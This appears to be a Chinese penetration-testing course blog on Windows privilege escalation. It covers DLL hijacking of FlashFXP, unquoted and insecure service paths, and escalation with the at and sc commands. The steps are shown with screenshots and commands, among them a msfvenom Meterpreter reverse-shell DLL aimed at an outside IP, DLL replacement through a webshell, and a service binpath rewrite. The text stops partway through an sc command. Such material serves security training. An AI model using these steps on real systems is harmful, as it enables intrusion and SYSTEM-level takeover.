src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422152115535.png" alt="image-20230422152115535"></p><h6 id="成功获取"><a href="#成功获取" class="headerlink" title="成功获取"></a>成功获取</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422152037247.png" alt="image-20230422152037247"></p><h6 id="踩坑点：经过测试，msf一定要加上所在目录，当我将这三个文件放在同一个目录时"><a href="#踩坑点：经过测试，msf一定要加上所在目录，当我将这三个文件放在同一个目录时" class="headerlink" title="踩坑点：经过测试，msf一定要加上所在目录，当我将这三个文件放在同一个目录时"></a>踩坑点：经过测试，msf一定要加上所在目录，当我将这三个文件放在同一个目录时</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230423001638771.png" alt="image-20230423001638771"></p><h6 id="直接这样执行，会监听不到任何东西，因为msf-exe没有启动"><a href="#直接这样执行，会监听不到任何东西，因为msf-exe没有启动" class="headerlink" title="直接这样执行，会监听不到任何东西，因为msf.exe没有启动"></a>直接这样执行，会监听不到任何东西，因为msf.exe没有启动</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230423001702906.png" alt="image-20230423001702906"></p><h6 id="但是直接拖拽，将其目录附上，msf就上线监听到了"><a href="#但是直接拖拽，将其目录附上，msf就上线监听到了" class="headerlink" title="但是直接拖拽，将其目录附上，msf就上线监听到了"></a>但是直接拖拽，将其目录附上，msf就上线监听到了</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230423001745843.png" alt="image-20230423001745843"></p><h3 id="Win2012-DLL劫持提权应用配合MSF-FlashFXP"><a href="#Win2012-DLL劫持提权应用配合MSF-FlashFXP" class="headerlink" title="#Win2012-DLL劫持提权应用配合MSF-FlashFXP"></a>#Win2012-DLL劫持提权应用配合MSF-FlashFXP</h3><p>原理：Windows程序启动的时候需要DLL。如果这些DLL 不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：</p><p>1、应用程序加载的目录</p><p>2、C:\Windows\System32</p><p>3、C:\Windows\System</p><p>4、C:\Windows</p><p>5、当前工作目录Current Working Directory，CWD</p><p>6、在PATH环境变量的目录（先系统后用户）</p><p><code>过程：信息收集-进程分析-制作dll并上传-替换dll-启动应用后成功</code></p><p>检测： ChkDllHijack 或者 火绒剑</p><p>项目：<a href="https://github.com/anhkgg/anhkgg-tools">https://github.com/anhkgg/anhkgg-tools</a></p><p>利用火绒剑进行进程分析加载DLL，一般寻程序DLL利用。</p><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;47.94.236.117  lport&#x3D;4444 -f dll -o xiaodi.dll</p><p>提前信息收集相关软件及DLL问题程序，本地调试成功后覆盖DLL实现利用</p><h5 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h5><h6 id="比如说在webshell的权限中发现了第三方的一些软件文件"><a href="#比如说在webshell的权限中发现了第三方的一些软件文件" class="headerlink" title="比如说在webshell的权限中发现了第三方的一些软件文件"></a>比如说在webshell的权限中发现了第三方的一些软件文件</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422163444613.png" alt="image-20230422163444613"></p><h6 id="可以去网上也下载一个这个软件，版本不一样没关系，调用逻辑一样的"><a href="#可以去网上也下载一个这个软件，版本不一样没关系，调用逻辑一样的" class="headerlink" title="可以去网上也下载一个这个软件，版本不一样没关系，调用逻辑一样的"></a>可以去网上也下载一个这个软件，版本不一样没关系，调用逻辑一样的</h6><h5 id="2、进程分析"><a href="#2、进程分析" class="headerlink" title="2、进程分析"></a>2、进程分析</h5><h6 id="火绒剑分析："><a href="#火绒剑分析：" class="headerlink" title="火绒剑分析："></a>火绒剑分析：</h6><h6 id="打开这个软件"><a href="#打开这个软件" class="headerlink" title="打开这个软件"></a>打开这个软件</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422163719023.png" alt="image-20230422163719023"></p><h6 id="打开火绒剑找到这个exe文件，看调用，发现调用了其文件下的两个dll文件"><a href="#打开火绒剑找到这个exe文件，看调用，发现调用了其文件下的两个dll文件" class="headerlink" title="打开火绒剑找到这个exe文件，看调用，发现调用了其文件下的两个dll文件"></a>打开火绒剑找到这个exe文件，看调用，发现调用了其文件下的两个dll文件</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422163946832.png" alt="image-20230422163946832"></p><h6 id="ChkDllHijack-分析："><a href="#ChkDllHijack-分析：" class="headerlink" title="ChkDllHijack 分析："></a>ChkDllHijack 分析：</h6><h6 id="把其目录下所有的dll文件测试"><a href="#把其目录下所有的dll文件测试" class="headerlink" title="把其目录下所有的dll文件测试"></a>把其目录下所有的dll文件测试</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422164223152.png" alt="image-20230422164223152"></p><h6 id="如果不调用的会显示如下"><a href="#如果不调用的会显示如下" class="headerlink" title="如果不调用的会显示如下"></a>如果不调用的会显示如下</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422164349529.png" alt="image-20230422164349529"></p><h5 id="3、制作dll并上传"><a href="#3、制作dll并上传" class="headerlink" title="3、制作dll并上传"></a>3、制作dll并上传</h5><h6 id="msf命令生成dll文件：msfvenom-p-windows-x2F-meterpreter-x2F-reverse-tcp-lhost-x3D-47-94-236-117-lport-x3D-4444-f-dll-o-xiaodi-dll，取出来后更名为libeay32-dll"><a href="#msf命令生成dll文件：msfvenom-p-windows-x2F-meterpreter-x2F-reverse-tcp-lhost-x3D-47-94-236-117-lport-x3D-4444-f-dll-o-xiaodi-dll，取出来后更名为libeay32-dll" class="headerlink" title="msf命令生成dll文件：msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;47.94.236.117  lport&#x3D;4444 -f dll -o xiaodi.dll，取出来后更名为libeay32.dll"></a>msf命令生成dll文件：msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;47.94.236.117  lport&#x3D;4444 -f dll -o xiaodi.dll，取出来后更名为libeay32.dll</h6><h6 id="在webshell中将原来的libeay32-dll删除"><a href="#在webshell中将原来的libeay32-dll删除" class="headerlink" title="在webshell中将原来的libeay32.dll删除"></a>在webshell中将原来的libeay32.dll删除</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422164915934.png" alt="image-20230422164915934"></p><h6 id="把生成的文件上传"><a href="#把生成的文件上传" class="headerlink" title="把生成的文件上传"></a>把生成的文件上传</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422164944809.png" alt="image-20230422164944809"></p><h6 id="msf开启监听模块监听4444端口"><a href="#msf开启监听模块监听4444端口" class="headerlink" title="msf开启监听模块监听4444端口"></a>msf开启监听模块监听4444端口</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422165028098.png" alt="image-20230422165028098"></p><h6 id="等待管理员触发那个flashfxp-exe文件，或者有权限的话用webshell自己触发，监听到会话，成功获取管理员权限"><a href="#等待管理员触发那个flashfxp-exe文件，或者有权限的话用webshell自己触发，监听到会话，成功获取管理员权限" class="headerlink" title="等待管理员触发那个flashfxp.exe文件，或者有权限的话用webshell自己触发，监听到会话，成功获取管理员权限"></a>等待管理员触发那个flashfxp.exe文件，或者有权限的话用webshell自己触发，监听到会话，成功获取管理员权限<img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422165135434.png" alt="image-20230422165135434"></h6><h6 id="随后getsystem，获得system权限"><a href="#随后getsystem，获得system权限" class="headerlink" title="随后getsystem，获得system权限"></a>随后getsystem，获得system权限</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422165251894.png" alt="image-20230422165251894"></p><h3 id="Win2012-不带引号服务路径配合MSF-MacroExpert"><a href="#Win2012-不带引号服务路径配合MSF-MacroExpert" class="headerlink" title="#Win2012-不带引号服务路径配合MSF-MacroExpert"></a>#Win2012-不带引号服务路径配合MSF-MacroExpert</h3><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422165852457.png" alt="image-20230422165852457"></p><p>原理：即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。</p><p><code>过程：检测服务权限配置-制作文件并上传-更改服务路径指向-调用后成功</code></p><p>检测项目：JAWS </p><p><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a></p><p>检测命令：wmic service get name,displayname,pathname,startmode |findstr &#x2F;i “Auto” |findstr &#x2F;i &#x2F;v “C:\Windows\“ |findstr &#x2F;i &#x2F;v “””    （指定不筛选C:\Windows下的文件路径，因为没有权限利用）</p><p>上传反弹exe，设置好对应执行名后，执行sc start “Macro Expert”</p><h5 id="1、检测服务权限配置"><a href="#1、检测服务权限配置" class="headerlink" title="1、检测服务权限配置"></a>1、检测服务权限配置</h5><p>执行JAWS</p><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422170439754.png" alt="image-20230422170439754"></p><h6 id="获取了三个，但是只有上面标记的那个可以，因为有空格"><a href="#获取了三个，但是只有上面标记的那个可以，因为有空格" class="headerlink" title="获取了三个，但是只有上面标记的那个可以，因为有空格"></a>获取了三个，但是只有上面标记的那个可以，因为有空格</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422170729011.png" alt="image-20230422170729011"></p><h5 id="2、制作文件并上传"><a href="#2、制作文件并上传" class="headerlink" title="2、制作文件并上传"></a>2、制作文件并上传</h5><h6 id="然后将生成的msf-exe重命名为program-exe文件上传到C盘目录下，因为这个文件是system启动的，后门有system权限"><a href="#然后将生成的msf-exe重命名为program-exe文件上传到C盘目录下，因为这个文件是system启动的，后门有system权限" class="headerlink" title="然后将生成的msf.exe重命名为program.exe文件上传到C盘目录下，因为这个文件是system启动的，后门有system权限"></a>然后将生成的msf.exe重命名为program.exe文件上传到C盘目录下，因为这个文件是system启动的，后门有system权限</h6><h6 id="执行服务"><a href="#执行服务" class="headerlink" title="执行服务"></a>执行服务</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422171401402.png" alt="image-20230422171401402"></p><h6 id="getuid直接发现获取了syste权限"><a href="#getuid直接发现获取了syste权限" class="headerlink" title="getuid直接发现获取了syste权限"></a>getuid直接发现获取了syste权限</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422171434502.png" alt="image-20230422171434502"></p><h3 id="Win2012-不安全的服务权限配合MSF-NewServices"><a href="#Win2012-不安全的服务权限配合MSF-NewServices" class="headerlink" title="#Win2012-不安全的服务权限配合MSF-NewServices"></a>#Win2012-不安全的服务权限配合MSF-NewServices</h3><p>原理：即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。</p><p>过程：检测服务权限配置-制作文件并上传-更改服务路径指向-调用后成功</p><p>检测脚本：accesschk PowerUp(PowerSploit)</p><p>1、accesschk.exe -uwcqv “administrators” *   （官方自带的exe）</p><p>2、Import-Module .\PowerUp.ps1</p><p>Invoke-All Checks</p><p><a href="https://github.com/411Hall/JAWS">https://github.com/411Hall/JAWS</a></p><p><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p><p>sc config “test” binpath&#x3D;”C:\Program.exe”</p><p>sc start test</p><h6 id="一般这种服务可以获取所有权限"><a href="#一般这种服务可以获取所有权限" class="headerlink" title="一般这种服务可以获取所有权限"></a>一般这种服务可以获取所有权限</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422175219685.png" alt="image-20230422175219685"></p><h6 id="用accesschk-exe或者JAWS，这里用JAWS，因为更好用"><a href="#用accesschk-exe或者JAWS，这里用JAWS，因为更好用" class="headerlink" title="用accesschk.exe或者JAWS，这里用JAWS，因为更好用"></a>用accesschk.exe或者JAWS，这里用JAWS，因为更好用</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422175908176.png" alt="image-20230422175908176"></p><h6 id="一般大部分的服务是不允许修改的，这里也就是说这个服务不安全可以修改相应的路径"><a href="#一般大部分的服务是不允许修改的，这里也就是说这个服务不安全可以修改相应的路径" class="headerlink" title="一般大部分的服务是不允许修改的，这里也就是说这个服务不安全可以修改相应的路径"></a>一般大部分的服务是不允许修改的，这里也就是说这个服务不安全可以修改相应的路径</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422180029537.png" alt="image-20230422180029537"></p><h6 id="因为这里可以修改路径，所以可以将这个服务调用的progarm-exe文件改为1-exe（msf生成的木马），然后上传这个1-exe到C盘，然后执行命令重启test服务"><a href="#因为这里可以修改路径，所以可以将这个服务调用的progarm-exe文件改为1-exe（msf生成的木马），然后上传这个1-exe到C盘，然后执行命令重启test服务" class="headerlink" title="因为这里可以修改路径，所以可以将这个服务调用的progarm.exe文件改为1.exe（msf生成的木马），然后上传这个1.exe到C盘，然后执行命令重启test服务"></a>因为这里可以修改路径，所以可以将这个服务调用的progarm.exe文件改为1.exe（msf生成的木马），然后上传这个1.exe到C盘，然后执行命令重启test服务</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422180536354.png" alt="image-20230422180536354"></p><h6 id="执行重启后监听获得system权限"><a href="#执行重启后监听获得system权限" class="headerlink" title="执行重启后监听获得system权限"></a>执行重启后监听获得system权限</h6><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422180746421.png" alt="image-20230422180746421"></p><p><img src="/../images/Day102-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-BypassUAC-DLL%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/image-20230422175730961.png" alt="image-20230422175730961"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Day101 权限提升-Win本地用户&amp;进程注入&amp;令牌窃取&amp;AT&amp;SC&amp;PS服务命令</title>
      <link href="/2023/04/17/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/04/17/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420165400538.png" alt="image-20230420165400538"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、服务配置-AT&amp;SC&amp;PS命令</p><p>2、权限迁移-令牌窃取&amp;进程注入</p><h3 id="截至目前思路点总结如下："><a href="#截至目前思路点总结如下：" class="headerlink" title="#截至目前思路点总结如下："></a>#截至目前思路点总结如下：</h3><p>1.提权方法有部分适用在不同环境，当然也有通用方法</p><p>2.提权方法也有操作系统版本区分，特性决定方法利用面</p><p>3.提权方法有部分需要特定环境，如数据库,第三方提权等</p><h3 id="思考点："><a href="#思考点：" class="headerlink" title="#思考点："></a>#思考点：</h3><p>1、如何判断采用什么数据库提权？</p><p>2、数据库提权首要条件密码获取？</p><p>3、有那些数据库类型可以进行提权？</p><p>4、操作系统在数据库提权中有那些疑问？</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、Web权限提升</p><p>2、系统权限提升</p><p>3、域控权限提升</p><h4 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h4><h5 id="1、具体有哪些权限需要我们了解掌握的？"><a href="#1、具体有哪些权限需要我们了解掌握的？" class="headerlink" title="1、具体有哪些权限需要我们了解掌握的？"></a>1、具体有哪些权限需要我们了解掌握的？</h5><p>后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等</p><h5 id="2、以上常见权限获取方法简要归类说明？"><a href="#2、以上常见权限获取方法简要归类说明？" class="headerlink" title="2、以上常见权限获取方法简要归类说明？"></a>2、以上常见权限获取方法简要归类说明？</h5><p>后台权限：SQL注入,数据库备份泄露，默认或弱口令等获取帐号密码进入</p><p>网站权限：后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达Shell</p><p>数据库权限：SQL注入,数据库备份泄露，默认或弱口令等进入或网站权限获取后转入</p><p>接口权限：SQL注入,数据库备份泄露，源码泄漏，培植不当等或网站权限获取后转入</p><p>系统权限：高危系统漏洞直达或网站权限提升转入、数据库权限提升转入，第三方转入等</p><p>域控权限：高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等</p><h5 id="3、以上常见权限获取后能操作的具体事情"><a href="#3、以上常见权限获取后能操作的具体事情" class="headerlink" title="3、以上常见权限获取后能操作的具体事情?"></a>3、以上常见权限获取后能操作的具体事情?</h5><h5 id="后台权限"><a href="#后台权限" class="headerlink" title="后台权限:"></a>后台权限:</h5><p>常规WEB界面文章分类等操作，后台功能可操作类</p><h5 id="网站权限："><a href="#网站权限：" class="headerlink" title="网站权限："></a>网站权限：</h5><p>查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备。</p><h5 id="数据库权限："><a href="#数据库权限：" class="headerlink" title="数据库权限："></a>数据库权限：</h5><p>操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配置文件读取获得。也可以作为提升系统权限手段。</p><h5 id="接口权限："><a href="#接口权限：" class="headerlink" title="接口权限："></a>接口权限：</h5><p>后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取），具体可以操作的事情大家自己想想。</p><p>系统权限：如同在你自己操作自己的电脑一样</p><p>域控权限：如同在你自己操作自己的虚拟机一样</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="只有土豆溢出漏洞才可以web低权限提升为system，其他都需要Administrtor权限"><a href="#只有土豆溢出漏洞才可以web低权限提升为system，其他都需要Administrtor权限" class="headerlink" title="只有土豆溢出漏洞才可以web低权限提升为system，其他都需要Administrtor权限"></a>只有土豆溢出漏洞才可以web低权限提升为system，其他都需要Administrtor权限</h4><h4 id="➢-WIN-本地用户-AT-amp-SC-amp-PS命令"><a href="#➢-WIN-本地用户-AT-amp-SC-amp-PS命令" class="headerlink" title="➢ WIN-本地用户-AT&amp;SC&amp;PS命令"></a>➢ WIN-本地用户-AT&amp;SC&amp;PS命令</h4><h4 id="➢-WIN-本地用户-进程迁移注入获取"><a href="#➢-WIN-本地用户-进程迁移注入获取" class="headerlink" title="➢ WIN-本地用户-进程迁移注入获取"></a>➢ WIN-本地用户-进程迁移注入获取</h4><h4 id="➢-WIN-本地-amp-Web-令牌窃取-amp-土豆溢出"><a href="#➢-WIN-本地-amp-Web-令牌窃取-amp-土豆溢出" class="headerlink" title="➢ WIN-本地&amp;Web-令牌窃取&amp;土豆溢出"></a>➢ WIN-本地&amp;Web-令牌窃取&amp;土豆溢出</h4></blockquote><h3 id="WIN-本地用户-AT-amp-SC-amp-PS命令"><a href="#WIN-本地用户-AT-amp-SC-amp-PS命令" class="headerlink" title="#WIN-本地用户-AT&amp;SC&amp;PS命令"></a>#WIN-本地用户-AT&amp;SC&amp;PS命令</h3><h5 id="1、at命令提权的原理"><a href="#1、at命令提权的原理" class="headerlink" title="1、at命令提权的原理"></a>1、at命令提权的原理</h5><p>at命令是一个计划命令，可以在规定时间完成一些操作，这个命令调用system权限。</p><p>适用版本：Win2000 &amp; Win2003 &amp; XP中还是存在的，在Win7以后被剔除.</p><p>当我们拿到低权限的用户，通过连接上服务器后，可以通过at命令来进行本地提权。</p><p>提权命令：Test in Win2003</p><p>at 20:18 &#x2F;interactive cmd (在20:33分生成一个交互式的System权限的cmd)</p><p><img src="/../images/Day101-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-AT-SC-PS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/image-20230420113855865.png" alt="image-20230420113855865"></p><h5 id="2、sc是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于控制面板中管理工具项中的服务。适用版本：windows-7、8、03、08、12、16（win2k3-ok-其他未测基本失败）"><a href="#2、sc是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于控制面板中管理工具项中的服务。适用版本：windows-7、8、03、08、12、16（win2k3-ok-其他未测基本失败）" class="headerlink" title="2、sc是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于控制面板中管理工具项中的服务。适用版本：windows 7、8、03、08、12、16（win2k3 ok 其他未测基本失败）"></a>2、sc是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于控制面板中管理工具项中的服务。适用版本：windows 7、8、03、08、12、16（win2k3 ok 其他未测基本失败）</h5><ul><li><p>提权命令：Test in Win2k3</p></li><li><p>#创建一个名叫syscmd的新的交互式的cmd执行服务</p><p>sc Create syscmd 